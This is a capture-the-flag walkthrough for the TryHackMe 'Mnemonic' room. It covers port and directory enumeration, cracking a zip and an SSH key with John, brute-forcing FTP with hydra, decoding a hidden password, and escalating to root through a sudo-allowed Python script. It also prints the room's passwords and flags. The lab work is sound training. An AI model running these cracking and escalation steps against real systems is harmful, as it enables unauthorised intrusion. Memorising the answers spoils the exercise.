---
description: https://tryhackme.com/room/mnemonic
---

# Mnemonic

## Mnemonic

{% embed url="https://www.youtube.com/watch?v=pBSR3DyobIY" %}

{% hint style="success" %}
No answer needed
{% endhint %}

## Enumerate

### How many open ports?

```bash
nmap -sC -sV -T5 -p1-65535 10.10.109.236
```

![](<../.gitbook/assets/image (135).png>)

{% hint style="success" %}
3
{% endhint %}

### What is the ssh port number?&#x20;

![](<../.gitbook/assets/image (136).png>)

{% hint style="success" %}
1337
{% endhint %}

### What is the name of the secret file?

![](<../.gitbook/assets/image (137).png>)

```bash
gobuster dir -u http://10.10.109.236 -w /usr/share/dirb/wordlists/common.txt

gobuster dir -u http://10.10.109.236 -w big.txt -x php,txt,html -t 50
```

![](<../.gitbook/assets/image (138).png>)

```bash
gobuster dir -u http://10.10.109.236/webmasters/ -w big.txt -x php,txt,html -t 50
```

![](<../.gitbook/assets/image (139).png>)

```bash
gobuster dir -u http://10.10.109.236/webmasters/admin/ -w big.txt -x php,txt,html -t 50

```

![](<../.gitbook/assets/image (143).png>)

```bash
gobuster dir -u http://10.10.109.236/webmasters/backups -w /usr/share/dirb/wordlists/common.txt -x sql,php,txt,css,zip,csv,dat,dbf,log,mdb,sav,tar,xml,cgi
```

![](<../.gitbook/assets/image (147).png>)

![](<../.gitbook/assets/image (144).png>)

{% hint style="success" %}
backups.zip
{% endhint %}

## Credentials

```bash
zip2john backups.zip > ziphash.txt
john ziphash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![](<../.gitbook/assets/image (145).png>)

```bash
unzip backups.zip
00385007
cat backups/note.txt
```

![](<../.gitbook/assets/image (146).png>)

### &#x20;ftp user name?&#x20;

```bash
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://10.10.109.236 -t 50 
```

{% hint style="success" %}
ftpuser
{% endhint %}

### ftp password?&#x20;

![](<../.gitbook/assets/image (148).png>)

{% hint style="success" %}
love4ever
{% endhint %}

### What is the ssh username?&#x20;

![](<../.gitbook/assets/image (149).png>)

![](<../.gitbook/assets/image (150).png>)

![](<../.gitbook/assets/image (151).png>)

{% hint style="success" %}
james
{% endhint %}

### What is the ssh password?

```bash
chmod 600 id_rsa
ssh -i id_rsa james@10.10.109.236
```

![](<../.gitbook/assets/image (152).png>)

```bash
python3 /usr/share/john/ssh2john.py id_rsa > john_ssh.txt
john --wordlist=/usr/share/wordlists/rockyou.txt john_ssh.txt

```

![](<../.gitbook/assets/image (153).png>)

{% hint style="success" %}
bluelove
{% endhint %}

### What is the condor password?&#x20;

```bash
ssh james@10.10.109.239 -p 1337
```

![](<../.gitbook/assets/image (158).png>)

![](<../.gitbook/assets/image (156).png>)

![](<../.gitbook/assets/image (157).png>)

![](<../.gitbook/assets/image (159).png>)

![](<../.gitbook/assets/image (160).png>)

![](<../.gitbook/assets/image (161).png>)

```bash
git clone https://github.com/MustafaTanguner/Mnemonic
cd Mnemonic/
python3 -m pip install --user colored
python3 -m pip install --user opencv-python
```

![](<../.gitbook/assets/image (162).png>)

```bash
python3 Mnemonic.py
/root/mnemonic/maxresdefault.jpg
2
/root/mnemonic/6450.txt
```

![](<../.gitbook/assets/image (163).png>)

{% hint style="success" %}
pasificbell1981
{% endhint %}

## Hack the machine

### user.txt&#x20;

{% hint style="success" %}
THM{a5f82a00e2feee3465249b855be71c01}
{% endhint %}

### root.txt

```bash
ssh -p 1337 condor@10.10.109.239
sudo -l
```

![](<../.gitbook/assets/image (165).png>)

![](<../.gitbook/assets/image (167).png>)

```bash
sudo /usr/bin/python3 /bin/examplecode.py
0
.
/bin/bash
```

![](<../.gitbook/assets/image (168).png>)

![](<../.gitbook/assets/image (170).png>)

{% hint style="success" %}
THM{2a4825f50b0c16636984b448669b0586}
{% endhint %}
